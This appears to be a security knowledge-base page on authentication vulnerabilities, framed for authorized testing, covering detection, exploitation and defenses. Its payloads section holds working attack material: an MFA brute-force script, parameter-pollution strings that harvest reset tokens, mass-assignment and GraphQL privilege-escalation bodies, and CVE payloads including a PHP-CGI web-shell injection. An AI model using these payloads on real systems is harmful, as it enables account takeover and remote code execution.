# Authentication Vulnerabilities

> Weak login, MFA, or credential handling lets attackers take over accounts. **Deep dive:** [`Troubleshooting_Guide/authentication.md`](../../../../Troubleshooting_Guide/authentication.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** A07:2021 Identification & Authentication Failures
**Status:** complete

## What it is
Authentication vulnerabilities are flaws in how an application verifies identity, letting an
attacker bypass login or impersonate another user. They span weak credential policy, missing
rate limits, broken multi-factor flows, and logic errors in registration, reset, or session
issuance.

## How it works
The attacker controls the inputs to the auth flow — usernames, passwords, MFA codes, reset
tokens, and request parameters. The application trusts these too readily: it leaks which
accounts exist through differential error messages or timing, fails to throttle guessing, lets
a user skip or replay an MFA step, or binds attacker-supplied fields (`role`, `isAdmin`) it
should ignore. Server-side parameter pollution further lets injected `&`/`#` characters rewrite
the query the backend forwards to an internal API, so a reset for the victim returns the
attacker a usable token.

## Impact
Full account takeover, including high-value or administrative accounts, with all the access and
data that identity carries. Because authentication is the gate to everything else, severity is
typically high to critical; a single bypass can compromise every account on the platform.

## How to detect
- Login responses that differ for valid vs. invalid usernames (text, status code, or response
  time) — a username-enumeration signal.
- No lockout or rate limiting after many failed passwords or MFA codes.
- MFA steps that can be skipped, reordered, or brute-forced (short numeric codes, no throttle).
- Password-reset or forgot-password responses that change when extra `&field=...%23` parameters
  are injected, or reflect a token/email back.
- APIs that accept extra JSON fields, hidden HTTP verbs (`PATCH`/`DELETE` via `OPTIONS`), or
  older versioned routes that skip newer checks.

## Exploitation (summary)
Enumerate valid usernames from error/timing differences, then spray or brute-force passwords
where no rate limit exists. Where MFA is weak, brute-force the short code or skip the second
step entirely. Abuse server-side parameter pollution on reset flows to harvest a victim's reset
token, and use mass assignment to grant yourself a privileged `role`. Full payloads and scripts
live in the Payloads section below.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Username enumeration & credential brute force
Error-message differences leak whether a username exists; chain enumeration into a password spray.

```http
POST /login
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrongpassword
```

- "Invalid username" vs. a different error (e.g. "Incorrect password") reveals valid accounts.
- Once a username is confirmed, brute-force the password from a wordlist; success shows as no "Incorrect password" error or a redirect.

### 2FA / MFA brute force
Short numeric codes with no rate limiting are exhaustively guessable. A 302 redirect to `/my-account` marks the hit.

```http
POST /login2
Content-Type: application/x-www-form-urlencoded

csrf=<csrf>&mfa-code=0000
```

```python
import requests
from bs4 import BeautifulSoup

URL = "https://target.web-security-academy.net"
s = requests.Session()

def login():
    r = s.get(f"{URL}/login")
    csrf = BeautifulSoup(r.text, "html.parser").find("input", {"name": "csrf"})["value"]
    s.post(f"{URL}/login", data={"csrf": csrf, "username": "carlos", "password": "montoya"})
    r = s.get(f"{URL}/login2")
    return BeautifulSoup(r.text, "html.parser").find("input", {"name": "csrf"})["value"]

for i in range(10000):
    if i % 2 == 0:
        csrf = login()
    r = s.post(f"{URL}/login2", data={"csrf": csrf, "mfa-code": str(i).zfill(4)}, allow_redirects=False)
    if r.status_code == 302 and "/my-account" in r.headers.get("Location", ""):
        print(f"Code found: {str(i).zfill(4)}")
        break
```

### Server-Side Parameter Pollution (SSPP)
Inject extra parameters into a value the server forwards to an internal API. `%26` injects `&`, `%23` truncates with `#`.

```http
username=administrator%26x=y           # inject &x=y
username=administrator%23              # truncate query string with #
username=administrator%26field=email%23
username=administrator%26field=reset_token%23
username=administrator%26field=password%23
username=administrator%26field=passwordResetToken%23
```

REST/path-based SSPP truncates or traverses the forwarded path:

```http
username=administrator#                       # truncate path
username=administrator?                        # confirm path placement
username=./administrator                       # relative path
username=../administrator                      # parent directory
username=../../../../#                          # find API root
username=../../../../openapi.json#
username=administrator/field/email#
username=administrator/field/passwordResetToken#
username=../../v1/users/administrator/field/passwordResetToken#
```

**Exploit flow:** post `username=<target>%26field=<field>%23` to `/forgot-password`, extract the 32-char hex token from the response, reset the password, then log in.

### API documentation & endpoint discovery
Truncate paths to walk back to documentation, then map structure.

```http
GET /api/user/wiener   -> 200
GET /api/user          -> reveals structure
GET /api               -> documentation
```

Common documentation paths:

```text
/api, /api/v1, /api/v2, /api/v3
/api/docs, /api/swagger, /api/redoc
/swagger.json, /swagger.yaml, /openapi.json, /openapi.yaml
/graphql, /api/graphql
/.well-known/openapi.json
```

### Unused / hidden HTTP methods
Enumerate accepted verbs, then abuse them for unauthorized writes.

```http
OPTIONS /api/products/3/price          # check Allow header
```

```http
PATCH /api/products/3/price
Content-Type: application/json

{"price": 0}
```

```http
DELETE /api/user/carlos
```

### Mass assignment
Submit hidden privileged fields the API binds without filtering.

```json
POST /api/users/register
{
  "username": "attacker",
  "password": "pass123",
  "email": "attacker@evil.com",
  "role": "admin",
  "isAdmin": true
}
```

```json
POST /api/checkout
{
  "chosen_discount": {"percentage": 100},
  "chosen_products": [{"product_id": "1", "quantity": 1}]
}
```

```json
POST /api/orders
{
  "items": [{"id": 1, "qty": 2}],
  "address": "123 Main St",
  "shipping_cost": 0,
  "tax_amount": 0,
  "is_premium": true
}
```

Nested objects can hide privileged fields below the top level:

```json
POST /api/user/update
{
  "profile": {
    "name": "John",
    "settings": {"notifications": true, "role": "admin"}
  }
}
```

Commonly bound hidden fields: `discount, chosen_discount, percentage, role, isAdmin, is_admin, is_superuser, balance, credits, account_balance, price, cost, shipping_cost, tax_amount, reset_token, passwordResetToken, api_key`.

### Parameter pollution & encoding bypasses
Conflicting duplicate parameters resolve differently per stack — useful for tampering and rate-limit bypass.

```http
GET /api/transfer?amount=1&from=user1&to=attacker&amount=1000
# PHP/Apache: last value wins (1000)
# ASP.NET: comma-joined (1,1000)
# JSP/Tomcat: first value (1)
```

```json
POST /api/checkout
{"total": 10, "total": 0}
```

```http
username=admin%2526field%253Dtoken%2523
# double-decodes to: admin&field=token#
```

```http
POST /api/forgot-password
username=dummy&user=admin#
# rate limit checks username, backend uses user
```

Blind SSPP can be confirmed by timing differences across `field=email|password|api_key`.

### GraphQL
Introspect the schema, then drive mass assignment through mutations.

```graphql
{ __schema { types { name fields { name type { name } } } } }
```

```graphql
mutation {
  updateUser(input: { name: "John", isAdmin: true, balance: 999999 }) {
    user { id name }
  }
}
```

### API version mixing
Older API versions may skip newer authorization checks.

```http
POST /api/users
X-API-Version: 1
```
```text
POST /api/v1/users
POST /api/users?version=1
{"api_version": "1", "data": {...}}
```

### Real-world CVE patterns

| CVE | Product | Technique |
|-----|---------|-----------|
| CVE-2024-21887 | Ivanti Connect Secure | SSPP path-traversal auth bypass |
| CVE-2023-42793 | JetBrains TeamCity | Mass assignment of admin role |
| CVE-2024-4577 | PHP CGI | Argument injection |

```http
POST /api/v1/totp/user-backup-code/../../system/user/admin
```

```json
POST /app/rest/users
{"username": "newuser", "password": "pass123", "roles": ["SYSTEM_ADMIN"]}
```

```http
GET /index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input
<?php system($_GET[cmd]); ?>
```

### URL encoding quick reference

| Char | Encoded | Purpose |
|------|---------|---------|
| `&` | `%26` | Inject additional parameter |
| `#` | `%23` | Truncate URL/query string |
| `?` | `%3F` | Start new query string |
| `.` | `%2E` | Path traversal |
| `/` | `%2F` | Path traversal |
| `\` | `%5C` | Path traversal (Windows) |

## Defenses
1. **Throttle and lock** — rate-limit and progressively lock login, MFA, and reset endpoints;
   add CAPTCHA after repeated failures.
2. **Uniform responses** — return identical errors and timing for valid vs. invalid usernames;
   never confirm account existence on login, registration, or reset.
3. **Strong MFA flow** — enforce the second factor server-side, bind it to the session so it
   cannot be skipped or reordered, use sufficiently long codes, and expire them quickly.
4. **Secure credentials** — strong password policy, salted slow hashing (bcrypt/argon2),
   breached-password checks, and short single-use reset tokens.
5. **Allow-list binding** — bind only expected fields server-side to defeat mass assignment;
   never trust `role`/`isAdmin` from the client.
6. **Normalize and validate inputs** — reject or canonicalize injected `&`/`#`/path characters
   before forwarding to internal APIs to prevent server-side parameter pollution.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=Authentication+Vulnerabilities
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Authentication+Vulnerabilities
- **Exploit-DB** — https://www.exploit-db.com/search?q=Authentication+Vulnerabilities
- **GitHub Advisories** — https://github.com/advisories?query=Authentication+Vulnerabilities
- **OSV** — https://osv.dev/list?q=Authentication+Vulnerabilities
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `Authentication Vulnerabilities <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2024-21887` — Ivanti Connect Secure auth-bypass chain via path traversal (exploited in the wild).
- `CVE-2023-42793` — JetBrains TeamCity authentication bypass enabling admin takeover.
- `CVE-2022-40684` — Fortinet FortiOS/FortiProxy auth bypass on the admin interface.

## References
- PortSwigger Web Security Academy — Authentication vulnerabilities.
- OWASP — Authentication Cheat Sheet & Forgot Password Cheat Sheet.
- OWASP — A07:2021 Identification and Authentication Failures.
